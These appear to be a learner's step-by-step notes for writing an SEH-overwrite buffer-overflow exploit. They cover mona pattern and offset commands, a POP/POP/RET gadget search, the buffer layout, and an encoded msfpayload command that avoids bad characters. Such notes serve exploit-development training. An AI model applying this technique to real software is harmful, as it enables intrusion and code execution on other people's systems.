1. Use immunity debugger to generate pattern of the length of the PoC (3000) [xpl-2.py]:
    - !mona pattern_create 3000
    - xpl: content + ptrn

2. Find pattern with which the NSEH value has been overwritten (position 2312):
    - !mona findmsp

4. Find a POP/POP/RET instruction from a non ASLR/Rebased/SafeSEH module
    - !mona seh

5. Overwrite nSEH with jmp 0x06 and SEH Handler with POP/POP/RET and add padding to trigger exception [xpl-3.py]
    - xpl: content + junk[2312] + nseh + sehhandler + pad[5000]
    - add breakpoint in SEH Handler to check it's executed

6.  Place CC asm instruction to check if everything is working  [xpl-4.py]
    - xpl: content + junk[2312] + nseh + sehhandler + payload + pad[5000]

7. Exchange the breakpoint instructions with your preferred payload [xpl-5.py]
    * Bad characters! What happens? 1. payload is not executed. Why? Exception is not triggered!
    - msfpayload windows/exec cmd=calc R | msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -t python
